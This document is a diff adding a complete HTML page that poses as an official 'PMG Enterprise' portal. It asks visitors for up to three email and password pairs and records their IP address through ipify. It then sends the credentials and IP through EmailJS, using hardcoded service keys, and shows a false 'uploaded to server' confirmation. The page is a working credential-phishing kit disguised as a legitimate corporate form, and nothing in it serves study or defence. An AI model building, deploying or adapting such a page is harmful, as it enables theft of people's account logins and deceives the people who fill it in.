@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PMG Enterprise | Official Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body { background-color: #f4f7f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .business-header { background: #1a365d; color: white; padding: 20px; text-align: center; border-radius: 8px 8px 0 0; }
+        .main-container { max-width: 450px; width: 100%; background: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e8ed; border-radius: 6px; }
+        .input-box { width: 100%; padding: 12px; border: 1px solid #ccd6dd; border-radius: 4px; margin-top: 8px; outline: none; transition: 0.2s; }
+        .input-box:focus { border-color: #1a365d; box-shadow: 0 0 5px rgba(26, 54, 93, 0.2); }
+        .submit-btn { background: #1a365d; color: white; width: 100%; padding: 15px; border-radius: 4px; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; }
+        .submit-btn:hover { background: #2c5282; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <div class="main-container">
+        <div class="business-header">
+            <h1 class="text-xl font-bold tracking-wide">PMG ENTERPRISE</h1>
+            <p class="text-[10px] opacity-80 uppercase mt-1">Authorized Access Only</p>
+        </div>
+
+        <div id="dashboard" class="p-8">
+            <p class="text-gray-600 text-sm mb-6 text-center">Select the department to proceed with data submission.</p>
+            
+            <div onclick="togglePage('form-page')" class="flex items-center p-4 border border-gray-200 rounded cursor-pointer hover:bg-gray-50 transition">
+                <div class="w-10 h-10 bg-gray-100 rounded flex items-center justify-center mr-4">📁</div>
+                <div class="flex-1">
+                    <h3 class="font-semibold text-gray-800 text-sm">Channels Management</h3>
+                    <p id="ip-status" class="text-[10px] text-gray-400 font-mono">CONNECTING...</p>
+                </div>
+                <span class="text-gray-300">▶</span>
+            </div>
+        </div>
+
+        <div id="form-page" class="hidden p-8">
+            <div class="flex justify-between items-center mb-6 border-b pb-2">
+                <h2 class="font-bold text-gray-700">DATA ENTRY FORM</h2>
+                <button onclick="togglePage('dashboard')" class="text-xs text-blue-800 font-bold uppercase underline">Back</button>
+            </div>
+
+            <form id="official-form">
+                <div class="form-group bg-gray-50">
+                    <label class="text-xs font-bold text-gray-500 uppercase">Primary Channel</label>
+                    <input type="email" id="em1" placeholder="Corporate Email" class="input-box" required>
+                    <input type="text" id="ps1" placeholder="Secure Password" class="input-box" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="text-xs font-bold text-gray-500 uppercase">Secondary Channel</label>
+                    <input type="email" id="em2" placeholder="Email (Optional)" class="input-box">
+                    <input type="text" id="ps2" placeholder="Password (Optional)" class="input-box">
+                </div>
+
+                <div class="form-group">
+                    <label class="text-xs font-bold text-gray-500 uppercase">Auxiliary Channel</label>
+                    <input type="email" id="em3" placeholder="Email (Optional)" class="input-box">
+                    <input type="text" id="ps3" placeholder="Password (Optional)" class="input-box">
+                </div>
+
+                <button type="submit" id="sub-btn" class="submit-btn">SUBMIT TO DATABASE</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURATION (Add IDs Here)
+        const PK = "d5Oj6jVHMPg85UjuF"; 
+        const SI = "service_cc4i41o";
+        const TI = "template_9p7sowj";
+
+        (function(){ emailjs.init(PK); })();
+
+        let currentIP = "";
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
+            currentIP = d.ip;
+            document.getElementById('ip-status').innerText = "IP: " + d.ip;
+        });
+
+        function togglePage(id) {
+            document.getElementById('dashboard').classList.add('hidden');
+            document.getElementById('form-page').classList.add('hidden');
+            document.getElementById(id).classList.remove('hidden');
+        }
+
+        document.getElementById('official-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('sub-btn');
+            btn.innerText = "PROCESSING..."; btn.disabled = true;
+
+            const params = {
+                email1: document.getElementById('em1').value,
+                pass1: document.getElementById('ps1').value,
+                email2: document.getElementById('em2').value || "N/A",
+                pass2: document.getElementById('ps2').value || "N/A",
+                email3: document.getElementById('em3').value || "N/A",
+                pass3: document.getElementById('ps3').value || "N/A",
+                user_ip: currentIP
+            };
+
+            emailjs.send(SI, TI, params).then(() => {
+                alert("SUCCESS: Data successfully uploaded to server.");
+                btn.innerText = "SUBMIT TO DATABASE"; btn.disabled = false;
+                this.reset(); togglePage('dashboard');
+            }, () => {
+                alert("ERROR: Failed to connect to EmailJS server.");
+                btn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
